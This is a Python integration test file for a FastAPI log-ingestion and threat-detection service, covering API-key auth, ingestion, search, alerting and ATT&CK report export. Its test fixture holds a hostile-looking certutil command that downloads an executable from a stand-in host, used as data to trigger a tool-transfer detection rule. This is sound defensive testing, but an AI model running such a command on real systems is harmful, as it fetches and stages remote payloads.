"""Real-PostgreSQL integration tests for the HTTP stack.

Drives the FastAPI app through a TestClient against a live database, so routing,
the lifespan bootstrap (schema init + detection-engine load), API-key auth, and
the synchronous ingest path are all exercised end-to-end. Runs only when DB_DSN
is set (see tests/conftest.py).
"""
from __future__ import annotations

import pytest

pytestmark = pytest.mark.integration

# A generic-JSON record whose message trips the ingress-tool-transfer rule.
SAMPLE = ('{"message": "certutil -urlcache -f http://evil.test/x.exe payload", '
          '"event.action": "download", "source.ip": "203.0.113.5"}')


def _client(clean_db):
    from starlette.testclient import TestClient

    from app.main import app
    return TestClient(app)


def test_health_ok(clean_db):
    with _client(clean_db) as c:
        r = c.get("/health")
    assert r.status_code == 200 and r.json()["status"] == "ok"


def test_ingest_api_auth_and_end_to_end(clean_db):
    db = clean_db
    rec = db.create_api_key("ci-key")

    with _client(db) as c:
        # no key -> 401
        assert c.post("/api/v1/ingest?format=generic_json", content=SAMPLE).status_code == 401
        # disabled/bogus key -> 401
        assert c.post("/api/v1/ingest?format=generic_json", content=SAMPLE,
                      headers={"X-API-Key": "lo_bogus"}).status_code == 401
        # valid key -> 200 and the batch summary
        r = c.post("/api/v1/ingest?format=generic_json&filename=feed.json",
                   content=SAMPLE, headers={"X-API-Key": rec["key"]})
        assert r.status_code == 200
        body = r.json()
        assert body["total"] == 1 and body["inserted"] == 1 and body["source_type"] == "api"

    # the event was stored (and is full-text searchable) ...
    assert db.search({"q": "certutil"}, 50, 0)[1] == 1
    # ... and detection ran inline during ingest (lifespan loaded the engine)
    alerts, _ = db.recent_alerts({}, 50, 0)
    assert any(a["rule_id"] == "lo-ingress-tool-transfer" for a in alerts)


def test_reports_dashboard_navigator_and_csv(clean_db):
    db = clean_db
    rec = db.create_api_key("ci-key")
    with _client(db) as c:
        c.post("/api/v1/ingest?format=generic_json", content=SAMPLE,
               headers={"X-API-Key": rec["key"]})        # fires the ingress-tool rule (T1105)
        assert c.get("/").status_code == 200              # dashboard renders the charts
        r = c.get("/reports?days=14")
        assert r.status_code == 200 and "security report" in r.text.lower()
        nav = c.get("/reports/attack-navigator.json?days=14")
        assert nav.status_code == 200
        layer = nav.json()
        assert layer["domain"] == "enterprise-attack"
        assert any(t["techniqueID"] == "T1105" for t in layer["techniques"])
        csvr = c.get("/alerts.csv")
        assert csvr.status_code == 200 and csvr.text.startswith("id,created_at")


def test_ingest_api_rejects_empty_and_unknown_format(clean_db):
    db = clean_db
    rec = db.create_api_key("ci-key")
    with _client(db) as c:
        h = {"X-API-Key": rec["key"]}
        assert c.post("/api/v1/ingest?format=generic_json", content="   ",
                      headers=h).status_code == 400
        assert c.post("/api/v1/ingest?format=no_such_parser", content=SAMPLE,
                      headers=h).status_code == 400
